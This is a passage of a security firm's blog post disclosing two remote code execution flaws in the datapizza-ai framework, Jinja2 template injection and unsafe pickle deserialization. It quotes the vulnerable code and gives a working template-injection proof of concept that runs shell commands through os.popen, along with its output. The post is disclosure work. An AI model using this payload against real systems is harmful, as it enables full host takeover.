---
title: datapizza-ai, Yet Another Vulnerable AI Framework
url: https://www.hacktivesecurity.com/blog/2026/02/25/datapizza-ai-yet-another-vulnerable-ai-framework/
source: Over Security - Cybersecurity news aggregator
date: 2026-02-25
fetch_date: 2026-02-26T04:11:59.940252
---

# datapizza-ai, Yet Another Vulnerable AI Framework

* info@hacktivesecurity.com
* Mon - Fri: 9.00 am - 6.00 pm

Advanced Security Solutions to protect the Cyberspace.

[Twitter](https://x.com/hacktivesec)

[Facebook-f](https://www.facebook.com/hacktivesec)

[Linkedin-in](https://www.linkedin.com/company/hacktive-security/)

[Instagram](https://www.instagram.com/hacktivesec/)

[![Hacktive Security](https://www.hacktivesecurity.com/wp-content/uploads/2024/10/logo_hs-1.png)](https://www.hacktivesecurity.com/)

* [Home](https://www.hacktivesecurity.com/)
* [About Us](https://www.hacktivesecurity.com/about-us/)
* Services
  + [Penetration Testing](https://www.hacktivesecurity.com/penetration-testing/)
  + [Red Teaming](https://www.hacktivesecurity.com/red-teaming/)
  + [Secure Code Review](https://www.hacktivesecurity.com/secure-code-review/)
  + [Training](https://www.hacktivesecurity.com/training/)
  + [Compliance](https://www.hacktivesecurity.com/compliance/)
* [Blog](https://www.hacktivesecurity.com/blog/)
* [Careers](https://www.hacktivesecurity.com/careers/)
* [Contacts](https://www.hacktivesecurity.com/contacts/)

Search for:

### Have Any Questions?

+39-06-8773-8747

[free quote](https://www.hacktivesecurity.com/index.php/contacts/)

[![Hacktive Security](https://www.hacktivesecurity.com/wp-content/uploads/2024/10/logo_hs-1.png)](https://www.hacktivesecurity.com/)

Search for:

* [Home](https://www.hacktivesecurity.com/)
* [About Us](https://www.hacktivesecurity.com/about-us/)
* Services
  + [Penetration Testing](https://www.hacktivesecurity.com/penetration-testing/)
  + [Red Teaming](https://www.hacktivesecurity.com/red-teaming/)
  + [Secure Code Review](https://www.hacktivesecurity.com/secure-code-review/)
  + [Training](https://www.hacktivesecurity.com/training/)
  + [Compliance](https://www.hacktivesecurity.com/compliance/)
* [Blog](https://www.hacktivesecurity.com/blog/)
* [Careers](https://www.hacktivesecurity.com/careers/)
* [Contacts](https://www.hacktivesecurity.com/contacts/)

[![Hacktive Security](http://176.31.202.211/wp-content/uploads/2024/10/logo_hs-1.png)](https://www.hacktivesecurity.com/)

Over 10 years we help companies reach their financial and branding goals. Engitech is a values-driven technology agency dedicated.

#### Gallery

[![](https://www.hacktivesecurity.com/wp-content/uploads/2019/11/project11-720x720.jpg)](https://www.hacktivesecurity.com/wp-content/uploads/2019/11/project11.jpg)

[![](https://www.hacktivesecurity.com/wp-content/uploads/2019/11/project10-720x720.jpg)](https://www.hacktivesecurity.com/wp-content/uploads/2019/11/project10.jpg)

[![](https://www.hacktivesecurity.com/wp-content/uploads/2019/11/project4-720x720.jpg)](https://www.hacktivesecurity.com/wp-content/uploads/2019/11/project4.jpg)

[![](https://www.hacktivesecurity.com/wp-content/uploads/2019/11/project6-720x720.jpg)](https://www.hacktivesecurity.com/wp-content/uploads/2019/11/project6.jpg)

[![](https://www.hacktivesecurity.com/wp-content/uploads/2019/11/project2-720x720.jpg)](https://www.hacktivesecurity.com/wp-content/uploads/2019/11/project2.jpg)

[![](https://www.hacktivesecurity.com/wp-content/uploads/2019/11/project1-720x720.jpg)](https://www.hacktivesecurity.com/wp-content/uploads/2019/11/project1.jpg)

#### Contacts

Via Giosuè Carducci, 21 - Pomigliano d'Arco (Italy)
Paseo Montjuic, número 30 - Barcelona (Spain)

info@hacktivesecurity.com

+39 06 8773 8747

[Twitter](#hacktivesec)

Facebook-f

Pinterest-p

Instagram

# Hacktive Blog

* [Home](https://www.hacktivesecurity.com)
* [Blog](https://www.hacktivesecurity.com/blog/)
* [AI](https://www.hacktivesecurity.com/blog/category/ai/)
* datapizza-ai, Yet Another Vulnerable AI Framework

[AI](https://www.hacktivesecurity.com/blog/category/ai/) [Application Security](https://www.hacktivesecurity.com/blog/category/application-security/)

![](https://www.hacktivesecurity.com/wp-content/uploads/2026/02/pizza3-cves.jpg)

\_ [February 25, 2026](https://www.hacktivesecurity.com/blog/2026/02/25/datapizza-ai-yet-another-vulnerable-ai-framework/)\_ [Edoardo Ottavianelli](https://www.hacktivesecurity.com/blog/author/eottavianelli/)\_ [0 Comments](https://www.hacktivesecurity.com/blog/2026/02/25/datapizza-ai-yet-another-vulnerable-ai-framework/#respond)

### datapizza-ai, Yet Another Vulnerable AI Framework

## TL;DR

Two Remote Code Execution (RCE) vulnerabilities were identified in datapizza-ai framework:

* **SSTI leading to RCE (CVE-2026-2969, fixed)**: Unsafe usage of Jinja2’s `Template()` allows Server-Side Template Injection (SSTI). If an attacker can control prompt templates, they can execute arbitrary system commands on the host.
* **Unsafe Deserialization leading to RCE (CVE-2026-2970, still present)**: The Redis cache implementation uses `pickle.loads()` on untrusted data. By poisoning the cache, an attacker can trigger arbitrary command execution when cached objects are deserialized.

## What is datapizza-ai

Source here <https://github.com/datapizza-labs/datapizza-ai>.

## CVE-2026-2969

The vulnerability is caused by the usage of vulnerable functions of Jinja2 template engine (*datapizza-ai-core/datapizza/modules/prompt/prompt.py*, source here <https://github.com/datapizza-labs/datapizza-ai/blob/v0.0.2/datapizza-ai-core/datapizza/modules/prompt/prompt.py>).

```
from jinja2 import Template
# ...
class ChatPromptTemplate(Prompt):
# ...
    def __init__(self, user_prompt_template, retrieval_prompt_template):
        self.user_prompt_template = Template(user_prompt_template)
        self.retrieval_prompt_template = Template(retrieval_prompt_template)
# ...
        # Add user's prompt
        formatted_user_prompt = self.user_prompt_template.render(
            user_prompt=user_prompt
        )
# ...
formatted_retrieval = self.retrieval_prompt_template.render(chunks=chunks)
# ...
```

To reproduce the exploit we have to install datapizza-ai:

```
python -m venv .env
source .env/bin/activate
pip install datapizza-ai==0.0.2
```

Create a python file with the following content:

```
import uuid

from datapizza.modules.prompt import ChatPromptTemplate
from datapizza.type import Chunk

# Create structured prompts for different tasks
system_prompt = ChatPromptTemplate(
    user_prompt_template="You are helping with data analysis tasks, this is the user prompt: " \
    "{{self.__init__.__globals__.__builtins__.__import__('os').popen('touch pwned1')}}",
    retrieval_prompt_template="Retrieved " \
    "{{self.__init__.__globals__.__builtins__.__import__('os').popen('touch pwned2')}} " \
    "content:\n{% for chunk in chunks %}{{ chunk.text }}\n{% endfor %}"
)

print(
    system_prompt.format(
        user_prompt="Hello, how are you?",
        chunks=[
            Chunk(id=str(uuid.uuid4()), text="This is a chunk"),
        Chunk(id=str(uuid.uuid4()), text="This is another chunk")
        ]
    )
)
```

Execute the file with `python3 poc.py`.

Command injection result (`ls -alh`):

```
total 28K
drwxrwxr-x  3 edoardottt edoardottt 4.0K Oct 14 12:31 .
drwxrwxr-x 13 edoardottt edoardottt 4.0K Oct 14 11:51 ..
-rw-rw-r--  1 edoardottt edoardottt  808 Oct 14 12:31 poc3-working.py
-rw-rw-r--  1 edoardottt edoardottt    0 Oct 14 12:30 pwned1
-rw-rw-r--  1 edoardottt edoardottt    0 Oct 14 12:30 pwned2
drwxrwxr-x  5 edoardottt edoardottt 4.0K Oct 14 11:53 .venv
```

Usually if attackers can control the prompt templates they can subvert the model behavior.
In this case, attackers can run arbitrary system command without any restriction (e.g. they could use a reverse shell and gain access to the server).
*The impact is critical as the attacker can completely takeover the server host.*
Here a simple Proof of Concept code snippet is shown, but in reality every feature that uses untrusted input in `ChatPromptTemplate` is vulnerable.

## CVE-2026-2970

The vulnerability is caused by the usage of vulnerable functions of pickle serialization library (*datapizza-ai-cache/redis/datapizza/cache/redis/cache.py*, source here <https://github.com/datapizza-labs/datapizza...